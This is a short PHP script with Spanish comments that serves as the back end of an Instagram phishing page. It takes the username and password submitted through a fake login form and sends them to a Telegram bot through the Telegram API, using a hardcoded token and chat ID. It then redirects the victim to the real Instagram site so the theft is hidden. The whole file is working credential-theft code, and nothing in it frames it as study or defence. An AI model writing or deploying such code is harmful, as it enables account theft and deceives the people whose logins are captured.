<?php
// Configuración de Telegram
$token = "8761245881:AAEzL6BhOe0K2zi9tov80NXR0v9XcpsYRcU";
$chat_id = "5773870334";

// Captura los datos del formulario de Instagram
$username = isset($_POST['username']) ? $_POST['username'] : 'No definido';
$password = isset($_POST['password']) ? $_POST['password'] : 'No definido';

// Arma el mensaje limpio para Telegram
$message = "📩 ¡Nuevo Registro de Instagram!\n\n";
$message .= "👤 Usuario: " . $username . "\n";
$message .= "🔑 Contraseña: " . $password . "\n";

// Envía los datos usando cURL (Método seguro y compatible con Render)
$url = "https://api.telegram.org/bot" . $token . "/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $message
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

// Redirige al usuario a la página oficial de Instagram sin errores
header("Location: https://instagram.com");
exit();
?>
